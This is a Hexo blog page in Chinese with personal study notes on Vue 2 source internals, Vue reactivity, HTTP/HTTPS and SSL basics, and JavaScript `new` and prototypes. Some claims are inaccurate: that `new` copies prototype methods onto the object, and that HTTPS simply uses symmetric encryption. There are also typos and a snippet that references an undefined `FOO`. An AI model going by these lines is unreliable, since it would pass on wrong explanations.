<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Hexo">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>Hexo</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Hexo</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/17/Vue源码/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/17/Vue源码/" itemprop="url">Vue源码</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-17T09:56:48+08:00">
                2019-07-17
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="new-Vue-Vue-实际上是一个类，该类在-JavaScript-中是用-Function-来实现的，Vue-只能通过-new-关键字初始化，然后会调用-this-init；Vue-初始化主要干了几件事：合并配置，初始化生命周期，初始化事件，初始化渲染，初始化-data、props、computed、watcher-等等；Vue-的初始化把不同的功能逻辑拆分成一些单独的函数执行，在初始化的最后，检测到如果有el属性，则调用vm-mount方法挂载vm-挂载的目标就是把模版渲染成最终的-DOM。Vue-中是通过-mount去挂载-vm-的，src-platform-web-entry-runtime-with-compiler-js该-js-文件中的代码首先缓存了原型上的-mount方法，再重新定义该方法。首先它对el做了限制，Vue-不能挂载在body和html这样的根结点上，接下来是很关键的逻辑：如果没有定义render方法则会把el或template字符串转换成render方法。这里我们要牢记，在-Vue2-0-版本中，所有-Vue-的组件的渲染最终都需要render方法，最后调用原先原型上的-mount方法挂载。-mount方法世纪会去调用mountComponent方法，该方法的核心就是先调用vm-render方法先生成虚拟-Node，再实例化一个渲染Watcher，在它的回调函数中会调用updateComponent方法，最终调用vm-update更新-DOM。Watcher在这里起到两个作用，一个是初始化的时候会执行回调函数，另一个是当vm实例中的监测的数据发生变化的时候执行回调函数，其实就是update。函数最后判断根结点的时候设置vm-isMounted为true，表示这个实例已经挂载了，同时执行mounted钩子函数。Vue-的-render方法是实例的一个私有方法，它用来把实例渲染成一个虚拟-Node。实际上，vm-createElement方法定义是在执行initRender方法的时候，可以看到除了vm-createElement方法，还有一个就是vm-c方法，它是被模版编译成的render函数使用，而vm-createElement是用户手写render方法使用的，这两个方法支持的参数相同，并且内部都调用了createElement方法。vm-render-最终是通过执行-createElement-方法并返回的是vnode，它是一个虚拟-Node。Vue-2-0-相比-Vue-1-0-最大的升级就是利用了-Virtual-DOM。因此在分析-createElement-的实现前，我们先了解一下-Virtual-DOM-的概念。Vue-js-利用createElement方法创建-VNode，createElement方法实际上是对-createElement-方法的封装，它允许传入的参数更加灵活，在处理这些参数后，调用真正创建-VNode-的函数-createElement-createElement-创建-VNode-的过程，每个-VNode-有-children，children-每个元素也是一个-VNode，这样就形成了一个-VNode-Tree，它很好的描述了我们的-DOM-Tree。回到-mountComponent-函数的过程，我们已经知道-vm-render-是如何创建了一个-VNode，接下来就是要把这个-VNode-渲染成一个真实的-DOM-并渲染出来，这个过程是通过-vm-update-完成的，接下来分析一下这个过程。Vue-的-update是实例的一个私有方法，它被调用的时机有两个，一个是首次渲染，一个是数据更新的时候，-update方法的作用是把-VNode-渲染成真实的-DOM，-update的核心就是调用vm-patch-方法；createPatchFunction方法传入了一个对象，包含nodeOps参数和modules参数。其中-nodeOps封装了一系列-DOM-操作的方法，modules定义了一些模块的钩子函数的实现-createPatchFunction内部定义了一系列的辅助方法，最终返回了一个patch方法，这个方法就赋值给了vm-update函数里调用的vm-patch-。在-createElm-过程中，如果-vnode-节点如果不包含-tag，则它有可能是一个注释或者纯文本节点，可以直接插入到父元素中。在我们这个例子中，最内层就是一个文本-vnode，它的-text-值取的就是之前的-this-message-的值-Hello-Vue-。再回到-patch-方法，首次渲染我们调用了-createElm-方法，这里传入的-parentElm是-oldVnode-elm-的父元素，-在我们的例子是id为-app-div的父元素，也就是-Body；实际上整个过程就是递归创建了一个完整的-DOM-树并插入到-Body-上。最后，我们根据之前递归createElm生成的-vnode-插入顺序队列，执行相关的insert-钩子函数，"><a href="#new-Vue-Vue-实际上是一个类，该类在-JavaScript-中是用-Function-来实现的，Vue-只能通过-new-关键字初始化，然后会调用-this-init；Vue-初始化主要干了几件事：合并配置，初始化生命周期，初始化事件，初始化渲染，初始化-data、props、computed、watcher-等等；Vue-的初始化把不同的功能逻辑拆分成一些单独的函数执行，在初始化的最后，检测到如果有el属性，则调用vm-mount方法挂载vm-挂载的目标就是把模版渲染成最终的-DOM。Vue-中是通过-mount去挂载-vm-的，src-platform-web-entry-runtime-with-compiler-js该-js-文件中的代码首先缓存了原型上的-mount方法，再重新定义该方法。首先它对el做了限制，Vue-不能挂载在body和html这样的根结点上，接下来是很关键的逻辑：如果没有定义render方法则会把el或template字符串转换成render方法。这里我们要牢记，在-Vue2-0-版本中，所有-Vue-的组件的渲染最终都需要render方法，最后调用原先原型上的-mount方法挂载。-mount方法世纪会去调用mountComponent方法，该方法的核心就是先调用vm-render方法先生成虚拟-Node，再实例化一个渲染Watcher，在它的回调函数中会调用updateComponent方法，最终调用vm-update更新-DOM。Watcher在这里起到两个作用，一个是初始化的时候会执行回调函数，另一个是当vm实例中的监测的数据发生变化的时候执行回调函数，其实就是update。函数最后判断根结点的时候设置vm-isMounted为true，表示这个实例已经挂载了，同时执行mounted钩子函数。Vue-的-render方法是实例的一个私有方法，它用来把实例渲染成一个虚拟-Node。实际上，vm-createElement方法定义是在执行initRender方法的时候，可以看到除了vm-createElement方法，还有一个就是vm-c方法，它是被模版编译成的render函数使用，而vm-createElement是用户手写render方法使用的，这两个方法支持的参数相同，并且内部都调用了createElement方法。vm-render-最终是通过执行-createElement-方法并返回的是vnode，它是一个虚拟-Node。Vue-2-0-相比-Vue-1-0-最大的升级就是利用了-Virtual-DOM。因此在分析-createElement-的实现前，我们先了解一下-Virtual-DOM-的概念。Vue-js-利用createElement方法创建-VNode，createElement方法实际上是对-createElement-方法的封装，它允许传入的参数更加灵活，在处理这些参数后，调用真正创建-VNode-的函数-createElement-createElement-创建-VNode-的过程，每个-VNode-有-children，children-每个元素也是一个-VNode，这样就形成了一个-VNode-Tree，它很好的描述了我们的-DOM-Tree。回到-mountComponent-函数的过程，我们已经知道-vm-render-是如何创建了一个-VNode，接下来就是要把这个-VNode-渲染成一个真实的-DOM-并渲染出来，这个过程是通过-vm-update-完成的，接下来分析一下这个过程。Vue-的-update是实例的一个私有方法，它被调用的时机有两个，一个是首次渲染，一个是数据更新的时候，-update方法的作用是把-VNode-渲染成真实的-DOM，-update的核心就是调用vm-patch-方法；createPatchFunction方法传入了一个对象，包含nodeOps参数和modules参数。其中-nodeOps封装了一系列-DOM-操作的方法，modules定义了一些模块的钩子函数的实现-createPatchFunction内部定义了一系列的辅助方法，最终返回了一个patch方法，这个方法就赋值给了vm-update函数里调用的vm-patch-。在-createElm-过程中，如果-vnode-节点如果不包含-tag，则它有可能是一个注释或者纯文本节点，可以直接插入到父元素中。在我们这个例子中，最内层就是一个文本-vnode，它的-text-值取的就是之前的-this-message-的值-Hello-Vue-。再回到-patch-方法，首次渲染我们调用了-createElm-方法，这里传入的-parentElm是-oldVnode-elm-的父元素，-在我们的例子是id为-app-div的父元素，也就是-Body；实际上整个过程就是递归创建了一个完整的-DOM-树并插入到-Body-上。最后，我们根据之前递归createElm生成的-vnode-插入顺序队列，执行相关的insert-钩子函数，" class="headerlink" title="new Vue:Vue 实际上是一个类，该类在 JavaScript 中是用 Function 来实现的，Vue 只能通过 new 关键字初始化，然后会调用 this._init；Vue 初始化主要干了几件事：合并配置，初始化生命周期，初始化事件，初始化渲染，初始化 data、props、computed、watcher 等等；Vue 的初始化把不同的功能逻辑拆分成一些单独的函数执行，在初始化的最后，检测到如果有el属性，则调用vm.$mount方法挂载vm,挂载的目标就是把模版渲染成最终的 DOM。Vue 中是通过$mount去挂载 vm 的，src/platform/web/entry-runtime-with-compiler.js该 js 文件中的代码首先缓存了原型上的$mount方法，再重新定义该方法。首先它对el做了限制，Vue 不能挂载在body和html这样的根结点上，接下来是很关键的逻辑：如果没有定义render方法则会把el或template字符串转换成render方法。这里我们要牢记，在 Vue2.0 版本中，所有 Vue 的组件的渲染最终都需要render方法，最后调用原先原型上的$mount方法挂载。$mount方法世纪会去调用mountComponent方法，该方法的核心就是先调用vm._render方法先生成虚拟 Node，再实例化一个渲染Watcher，在它的回调函数中会调用updateComponent方法，最终调用vm._update更新 DOM。Watcher在这里起到两个作用，一个是初始化的时候会执行回调函数，另一个是当vm实例中的监测的数据发生变化的时候执行回调函数，其实就是update。函数最后判断根结点的时候设置vm._isMounted为true，表示这个实例已经挂载了，同时执行mounted钩子函数。Vue 的_render方法是实例的一个私有方法，它用来把实例渲染成一个虚拟 Node。实际上，vm.$createElement方法定义是在执行initRender方法的时候，可以看到除了vm.$createElement方法，还有一个就是vm._c方法，它是被模版编译成的render函数使用，而vm.$createElement是用户手写render方法使用的，这两个方法支持的参数相同，并且内部都调用了createElement方法。vm._render  最终是通过执行  createElement  方法并返回的是vnode，它是一个虚拟 Node。Vue 2.0 相比 Vue 1.0 最大的升级就是利用了 Virtual DOM。因此在分析  createElement  的实现前，我们先了解一下 Virtual DOM 的概念。Vue.js 利用createElement方法创建 VNode，createElement方法实际上是对  _createElement  方法的封装，它允许传入的参数更加灵活，在处理这些参数后，调用真正创建 VNode 的函数  _createElement, createElement  创建 VNode 的过程，每个 VNode 有  children，children  每个元素也是一个 VNode，这样就形成了一个 VNode Tree，它很好的描述了我们的 DOM Tree。回到  mountComponent  函数的过程，我们已经知道  vm._render  是如何创建了一个 VNode，接下来就是要把这个 VNode 渲染成一个真实的 DOM 并渲染出来，这个过程是通过  vm._update  完成的，接下来分析一下这个过程。Vue 的_update是实例的一个私有方法，它被调用的时机有两个，一个是首次渲染，一个是数据更新的时候，_update方法的作用是把 VNode 渲染成真实的 DOM，_update的核心就是调用vm.\_patch_方法；createPatchFunction方法传入了一个对象，包含nodeOps参数和modules参数。其中,nodeOps封装了一系列 DOM 操作的方法，modules定义了一些模块的钩子函数的实现,createPatchFunction内部定义了一系列的辅助方法，最终返回了一个patch方法，这个方法就赋值给了vm._update函数里调用的vm._patch_。在 createElm 过程中，如果 vnode 节点如果不包含 tag，则它有可能是一个注释或者纯文本节点，可以直接插入到父元素中。在我们这个例子中，最内层就是一个文本 vnode，它的 text 值取的就是之前的 this.message 的值 Hello Vue!。再回到 patch 方法，首次渲染我们调用了 createElm 方法，这里传入的 parentElm是 oldVnode.elm 的父元素， 在我们的例子是id为#app div的父元素，也就是 Body；实际上整个过程就是递归创建了一个完整的 DOM 树并插入到 Body 上。最后，我们根据之前递归createElm生成的 vnode 插入顺序队列，执行相关的insert  钩子函数，"></a><ol><li>new Vue:Vue 实际上是一个类，该类在 JavaScript 中是用 Function 来实现的，Vue 只能通过 new 关键字初始化，然后会调用 this._init；Vue 初始化主要干了几件事：合并配置，初始化生命周期，初始化事件，初始化渲染，初始化 data、props、computed、watcher 等等；Vue 的初始化把不同的功能逻辑拆分成一些单独的函数执行，在初始化的最后，检测到如果有<font color="red"><code>el</code></font>属性，则调用<font color="red"><code>vm.$mount</code></font>方法挂载<font color="red"><code>vm</code></font>,挂载的目标就是把模版渲染成最终的 DOM。</li><li>Vue 中是通过<code>$mount</code>去挂载 vm 的，<code>src/platform/web/entry-runtime-with-compiler.js</code>该 js 文件中的代码首先缓存了原型上的<code>$mount</code>方法，再重新定义该方法。首先它对<code>el</code>做了限制，Vue 不能挂载在<code>body</code>和<code>html</code>这样的根结点上，接下来是很关键的逻辑：如果没有定义<code>render</code>方法则会把<code>el</code>或<code>template</code>字符串转换成<code>render</code>方法。这里我们要牢记，在 Vue2.0 版本中，所有 Vue 的组件的渲染最终都需要<code>render</code>方法，最后调用原先原型上的<code>$mount</code>方法挂载。<code>$mount</code>方法世纪会去调用<code>mountComponent</code>方法，该方法的核心就是先调用<code>vm._render</code>方法先生成虚拟 Node，再实例化一个渲染<code>Watcher</code>，在它的回调函数中会调用<code>updateComponent</code>方法，最终调用<code>vm._update</code>更新 DOM。<code>Watcher</code>在这里起到两个作用，一个是初始化的时候会执行回调函数，另一个是当<code>vm</code>实例中的监测的数据发生变化的时候执行回调函数，其实就是<code>update</code>。函数最后判断根结点的时候设置<code>vm._isMounted</code>为<code>true</code>，表示这个实例已经挂载了，同时执行<code>mounted</code>钩子函数。</li><li>Vue 的<code>_render</code>方法是实例的一个私有方法，它用来把实例渲染成一个虚拟 Node。实际上，<code>vm.$createElement</code>方法定义是在执行<code>initRender</code>方法的时候，可以看到除了<code>vm.$createElement</code>方法，还有一个就是<code>vm._c</code>方法，它是被模版编译成的<code>render</code>函数使用，而<code>vm.$createElement</code>是用户手写<code>render</code>方法使用的，这两个方法支持的参数相同，并且内部都调用了<code>createElement</code>方法。vm._render  最终是通过执行  createElement  方法并返回的是<code>vnode</code>，它是一个虚拟 Node。Vue 2.0 相比 Vue 1.0 最大的升级就是利用了 Virtual DOM。因此在分析  createElement  的实现前，我们先了解一下 Virtual DOM 的概念。</li><li>Vue.js 利用<code>createElement</code>方法创建 VNode，<code>createElement</code>方法实际上是对  <code>_createElement</code>  方法的封装，它允许传入的参数更加灵活，在处理这些参数后，调用真正创建 VNode 的函数  <code>_createElement</code>, createElement  创建 VNode 的过程，每个 VNode 有  children，children  每个元素也是一个 VNode，这样就形成了一个 VNode Tree，它很好的描述了我们的 DOM Tree。回到  mountComponent  函数的过程，我们已经知道  <code>vm._render</code>  是如何创建了一个 <code>VNode</code>，接下来就是要把这个 <code>VNode</code> 渲染成一个真实的 DOM 并渲染出来，这个过程是通过  <code>vm._update</code>  完成的，接下来分析一下这个过程。</li><li>Vue 的<code>_update</code>是实例的一个私有方法，它被调用的时机有两个，一个是首次渲染，一个是数据更新的时候，<code>_update</code>方法的作用是把 VNode 渲染成真实的 DOM，<code>_update</code>的核心就是调用<code>vm.\_patch_</code>方法；<code>createPatchFunction</code>方法传入了一个对象，包含<code>nodeOps</code>参数和<code>modules</code>参数。其中,<code>nodeOps</code>封装了一系列 DOM 操作的方法，<code>modules</code>定义了一些模块的钩子函数的实现,<code>createPatchFunction</code>内部定义了一系列的辅助方法，最终返回了一个<code>patch</code>方法，这个方法就赋值给了<code>vm._update</code>函数里调用的<code>vm._patch_</code>。在 <code>createElm</code> 过程中，如果 <code>vnode</code> 节点如果不包含 <code>tag</code>，则它有可能是一个注释或者纯文本节点，可以直接插入到父元素中。在我们这个例子中，最内层就是一个文本 <code>vnode</code>，它的 <code>text</code> 值取的就是之前的 <code>this.message</code> 的值 Hello Vue!。再回到 patch 方法，首次渲染我们调用了 <code>createElm</code> 方法，这里传入的 <code>parentElm</code>是 <code>oldVnode.elm</code> 的父元素， 在我们的例子是<code>id</code>为<code>#app</code> <code>div</code>的父元素，也就是 Body；实际上整个过程就是递归创建了一个完整的 DOM 树并插入到 Body 上。最后，我们根据之前递归<code>createElm</code>生成的 <code>vnode</code> 插入顺序队列，执行相关的<code>insert</code>  钩子函数，</li></ol></h4>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/09/April/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/04/09/April/" itemprop="url">April</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-09T13:34:04+08:00">
                2019-04-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="1-同源的定义：端口，协议，域名都一致。"><a href="#1-同源的定义：端口，协议，域名都一致。" class="headerlink" title="1.同源的定义：端口，协议，域名都一致。"></a>1.同源的定义：端口，协议，域名都一致。<img src="../img/kuayu.png" alt="跨域"></h4><h4 id="2-VUE的响应式原理：例如：Vue的一个实例对象a，其中有一个属性a-b，那么在实例化的过程中，通过Object-defineProperyu-会对a-b添加getter和setter，同时Vue-js会对模版进行编译，解析生成一个指令对象（这里是v-text指令），每个指令对象都会关联一个Watcher。当a-b求值的时候，就会触发它的getter，当修改a-b的值的时候，就会触发它的setter，同时会通知被关联的Watcher，然后Wactcher就会再次对a-b求值，计算对比新旧值，当值改变了，Watcher就会通知到指令，调用指令的upadta-方法，由于指令是对DOM的封装，所以就会调用DOM的原生方法去更新视图，这样就完成了数据改变到视图更新的一个自动过程。"><a href="#2-VUE的响应式原理：例如：Vue的一个实例对象a，其中有一个属性a-b，那么在实例化的过程中，通过Object-defineProperyu-会对a-b添加getter和setter，同时Vue-js会对模版进行编译，解析生成一个指令对象（这里是v-text指令），每个指令对象都会关联一个Watcher。当a-b求值的时候，就会触发它的getter，当修改a-b的值的时候，就会触发它的setter，同时会通知被关联的Watcher，然后Wactcher就会再次对a-b求值，计算对比新旧值，当值改变了，Watcher就会通知到指令，调用指令的upadta-方法，由于指令是对DOM的封装，所以就会调用DOM的原生方法去更新视图，这样就完成了数据改变到视图更新的一个自动过程。" class="headerlink" title="2.VUE的响应式原理：例如：Vue的一个实例对象a，其中有一个属性a.b，那么在实例化的过程中，通过Object.defineProperyu()会对a.b添加getter和setter，同时Vue.js会对模版进行编译，解析生成一个指令对象（这里是v-text指令），每个指令对象都会关联一个Watcher。当a.b求值的时候，就会触发它的getter，当修改a.b的值的时候，就会触发它的setter，同时会通知被关联的Watcher，然后Wactcher就会再次对a.b求值，计算对比新旧值，当值改变了，Watcher就会通知到指令，调用指令的upadta()方法，由于指令是对DOM的封装，所以就会调用DOM的原生方法去更新视图，这样就完成了数据改变到视图更新的一个自动过程。"></a>2.VUE的响应式原理：例如：Vue的一个实例对象a，其中有一个属性a.b，那么在实例化的过程中，通过<code>Object.defineProperyu()</code>会对a.b添加<code>getter</code>和<code>setter</code>，同时Vue.js会对模版进行编译，解析生成一个指令对象（这里是<code>v-text</code>指令），每个指令对象都会关联一个Watcher。当a.b求值的时候，就会触发它的<code>getter</code>，当修改a.b的值的时候，就会触发它的<code>setter</code>，同时会通知被关联的<code>Watcher</code>，然后<code>Wactcher</code>就会再次对a.b求值，计算对比新旧值，当值改变了，<code>Watcher</code>就会通知到指令，调用指令的<code>upadta()</code>方法，由于指令是对<code>DOM</code>的封装，所以就会调用DOM的原生方法去更新视图，这样就完成了数据改变到视图更新的一个自动过程。</h4><h4 id="3-计算属性-Vue生命周期：看官方文档或者“https-blog-csdn-net-smartdt-article-details-75557369”"><a href="#3-计算属性-Vue生命周期：看官方文档或者“https-blog-csdn-net-smartdt-article-details-75557369”" class="headerlink" title="3.计算属性+Vue生命周期：看官方文档或者“https://blog.csdn.net/smartdt/article/details/75557369”"></a>3.计算属性+Vue生命周期：看官方文档或者“<a href="https://blog.csdn.net/smartdt/article/details/75557369”" target="_blank" rel="noopener">https://blog.csdn.net/smartdt/article/details/75557369”</a></h4><h4 id="4-关于http可以看自己的hexo博客-http简单来说是一个应用层协议，http默认端口是80；"><a href="#4-关于http可以看自己的hexo博客-http简单来说是一个应用层协议，http默认端口是80；" class="headerlink" title="4.关于http可以看自己的hexo博客/http简单来说是一个应用层协议，http默认端口是80；"></a>4.关于http可以看自己的hexo博客/http简单来说是一个应用层协议，http默认端口是80；</h4><h4 id="5-https：通俗来说，https就是http的加密，并且其采用对称加密方法：这是一种最快速，最简单的一种加密方法，采用单钥密码系统的加密方法，同一个密钥可以同时用作信息的加密和解密，对称加密是用一个密钥来解密的。（具体看第六点）"><a href="#5-https：通俗来说，https就是http的加密，并且其采用对称加密方法：这是一种最快速，最简单的一种加密方法，采用单钥密码系统的加密方法，同一个密钥可以同时用作信息的加密和解密，对称加密是用一个密钥来解密的。（具体看第六点）" class="headerlink" title="5.https：通俗来说，https就是http的加密，并且其采用对称加密方法：这是一种最快速，最简单的一种加密方法，采用单钥密码系统的加密方法，同一个密钥可以同时用作信息的加密和解密，对称加密是用一个密钥来解密的。（具体看第六点）"></a>5.https：通俗来说，https就是http的加密，并且其采用对称加密方法：这是一种最快速，最简单的一种加密方法，采用单钥密码系统的加密方法，同一个密钥可以同时用作信息的加密和解密，对称加密是用一个密钥来解密的。（具体看第六点）</h4><h4 id="6-SSL协议：SSL是保证服务器和客户端安全通信的一种协议，简单来说，就是对传输信息进行加密保证安全的协议。HTTP报文通过SSL的加解密变成了安全的https。然后来看看证书：证书可以简单看成网站在网络中的身份证，每次访问某个网站的时候，其实我们都会检查它的身份证是否可靠。证书除了验证身份可靠外，还参与了SSL会话建立的过程。"><a href="#6-SSL协议：SSL是保证服务器和客户端安全通信的一种协议，简单来说，就是对传输信息进行加密保证安全的协议。HTTP报文通过SSL的加解密变成了安全的https。然后来看看证书：证书可以简单看成网站在网络中的身份证，每次访问某个网站的时候，其实我们都会检查它的身份证是否可靠。证书除了验证身份可靠外，还参与了SSL会话建立的过程。" class="headerlink" title="6.SSL协议：SSL是保证服务器和客户端安全通信的一种协议，简单来说，就是对传输信息进行加密保证安全的协议。HTTP报文通过SSL的加解密变成了安全的https。然后来看看证书：证书可以简单看成网站在网络中的身份证，每次访问某个网站的时候，其实我们都会检查它的身份证是否可靠。证书除了验证身份可靠外，还参与了SSL会话建立的过程。"></a>6.SSL协议：<code>SSL</code>是保证服务器和客户端安全通信的一种协议，简单来说，就是对传输信息进行加密保证安全的协议。HTTP报文通过SSL的加解密变成了安全的https。然后来看看<code>证书</code>：证书可以简单看成网站在网络中的身份证，每次访问某个网站的时候，其实我们都会检查它的身份证是否可靠。证书除了验证身份可靠外，还参与了SSL会话建立的过程。</h4><blockquote>
<p>因为加密方式存在对称加密和非对称加密的两种方式，可是使用对称总不能把密钥明文发过去服务端，使用非对称加密的效率低。所以这时就出现了ssl：首先使用非对称加密的方式把对称加密的密钥传给对方，然后都知道对称密钥的客户端和服务端再采取对称加密进行通讯。即使截取到了也是加了密的密钥。这就是ssl的原理。</p>
</blockquote>
<h4 id="7-gulp：”https-www-gulpjs-com-cn-quot"><a href="#7-gulp：”https-www-gulpjs-com-cn-quot" class="headerlink" title="7.gulp：”https://www.gulpjs.com.cn/&quot;"></a>7.gulp：”<a href="https://www.gulpjs.com.cn/&quot;" target="_blank" rel="noopener">https://www.gulpjs.com.cn/&quot;</a></h4><h4 id="8-new-new关键字做了5件事情："><a href="#8-new-new关键字做了5件事情：" class="headerlink" title="8.new:new关键字做了5件事情："></a>8.new:new关键字做了5件事情：</h4><blockquote>
<p>1.创建Object<br>2.查找class的prototype上的所有方法、属性，复制一份给创建的Object，如果prototype上有属性是function或者数组或者Object，那么只复制指针。<br>3.将构造函数classA内部的this指向创建的Object<br>4.创建的Object的<strong>proto</strong>指向class的prototype<br>5.执行构造函数class</p>
</blockquote>
<h4 id="9-原型："><a href="#9-原型：" class="headerlink" title="9.原型："></a>9.原型：</h4><blockquote>
<p>console.log(Object instanceof Function); //true<br>console.log(Function instanceof Object); //true<br>console.log(Function instanceof Function); //true<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line"><span class="keyword">var</span> f1 = <span class="keyword">new</span> Foo();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f1 <span class="keyword">instanceof</span> FOO)； <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(f1 <span class="keyword">instanceof</span> <span class="built_in">Object</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<h4 id="10-delete和Vue-delete删除数组的区别"><a href="#10-delete和Vue-delete删除数组的区别" class="headerlink" title="10.delete和Vue.delete删除数组的区别"></a>10.delete和Vue.delete删除数组的区别</h4><blockquote>
<p>delete只是被删除的元素变成了empty/undefined，其他的元素的键值还是不变。</p>
</blockquote>
<blockquote>
<p><code>Vue.delete</code>直接删掉了数组，改变了数组的键值。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">delete</span> a[<span class="number">1</span>];</span><br><span class="line"><span class="built_in">console</span>.log(a);  </span><br><span class="line"><span class="keyword">this</span>.$<span class="keyword">delete</span>(b,<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.log(b);</span><br></pre></td></tr></table></figure></p>
</blockquote>
